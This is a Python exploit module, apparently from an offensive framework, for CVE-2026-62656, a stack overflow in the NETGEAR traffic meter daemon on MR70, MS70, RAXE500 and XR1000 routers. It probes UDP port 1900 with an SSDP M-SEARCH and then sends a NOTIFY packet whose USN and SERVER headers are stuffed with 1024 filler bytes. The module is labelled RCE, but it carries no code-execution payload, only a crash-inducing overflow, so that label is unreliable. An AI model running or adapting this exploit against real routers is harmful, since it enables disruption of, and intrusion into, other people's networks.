# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """NETGEAR MR70/MS70/RAXE500/XR1000 Traffic Intercept RCE (CVE-2026-62656).

    The traffic meter service on NETGEAR Nighthawk and Orbi Pro models
    contains a buffer overflow vulnerability in the traffic statistics
    parsing logic. When processing crafted UPnP SSDP packets with
    oversized header fields, the ``traffic_meter`` daemon overflows a
    stack buffer, allowing adjacent-network code execution.

    CVSS v3.1: 8.8 (High), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "NETGEAR Traffic Meter Buffer Overflow RCE (CVE-2026-62656)",
        "description": (
            "Exploits CVE-2026-62656 via a stack buffer overflow in the "
            "NETGEAR traffic meter daemon. Crafted UPnP SSDP packets "
            "with oversized header fields overflow a stack buffer in "
            "the traffic statistics parser, enabling code execution "
            "from the local network."
        ),
        "authors": (
            "Security researcher (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-62656",
            "https://kb.netgear.com/000066540/Security-Advisory",
        ),
        "disclosure_date": "2026-06-12",
        "platform": "linux",
        "arch": "arm",
        "privileged": True,
        "targets": (
            "NETGEAR MR70 (firmware < 1.1.0.74)",
            "NETGEAR MS70 (firmware < 1.1.0.74)",
            "NETGEAR RAXE500 (firmware < 1.0.14.134)",
            "NETGEAR XR1000 (firmware < 1.0.0.74)",
        ),
    }

    target = OptIP("", "Target NETGEAR router IP")
    port = OptPort(1900, "UPnP SSDP port")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    overflow_size = OptInteger(1024, "Overflow payload size in bytes")

    _SSDP_MULTICAST = "239.255.255.250"
    _SSDP_PORT = 1900

    def _build_ssdp_overflow(self) -> bytes:
        """Build a crafted SSDP NOTIFY with oversized header fields."""
        overflow = "A" * self.overflow_size
        packet = (
            "NOTIFY * HTTP/1.1\r\n"
            f"HOST: {self._SSDP_MULTICAST}:{self._SSDP_PORT}\r\n"
            f"NT: urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n"
            f"NTS: ssdp:alive\r\n"
            f"USN: uuid:device-{overflow}::urn:schemas-upnp-org:device\r\n"
            f"LOCATION: http://{self.target}:5555/rootDesc.xml\r\n"
            f"SERVER: Linux/3.4 UPnP/1.0 {overflow}\r\n"
            f"CACHE-CONTROL: max-age=1800\r\n"
            "\r\n"
        )
        return packet.encode("utf-8")

    def _send_ssdp(self, packet: bytes) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.settimeout(self.timeout)
            sock.sendto(packet, (str(self.target), self._SSDP_PORT))
            sock.close()
            return True
        except OSError:
            return False

    @mute
    def check(self) -> bool:
        """Check if target responds to SSDP M-SEARCH."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.settimeout(self.timeout)
            msearch = (
                "M-SEARCH * HTTP/1.1\r\n"
                f"HOST: {self._SSDP_MULTICAST}:{self._SSDP_PORT}\r\n"
                'MAN: "ssdp:discover"\r\n'
                "MX: 2\r\n"
                "ST: ssdp:all\r\n"
                "\r\n"
            ).encode()
            sock.sendto(msearch, (str(self.target), self._SSDP_PORT))
            try:
                data, _ = sock.recvfrom(4096)
                sock.close()
                return len(data) > 0
            except (OSError, TimeoutError):
                sock.close()
                return False
        except OSError:
            return False

    def run(self) -> None:
        if not self.check():
            print_error(f"Target {self.target} does not respond to SSDP")
            return

        print_success("SSDP service detected; sending overflow payload")
        self._exploit()

    def _exploit(self) -> None:
        packet = self._build_ssdp_overflow()

        print_status(
            f"Sending SSDP NOTIFY with {self.overflow_size}-byte overflow "
            f"in USN and SERVER headers ({len(packet)} bytes total)"
        )

        if self._send_ssdp(packet):
            print_success(
                "Overflow packet delivered. If the traffic meter daemon "
                "is vulnerable, the oversized SSDP headers will corrupt "
                "the stack frame. Monitor target for crash or code execution."
            )
        else:
            print_error("Failed to send SSDP packet")
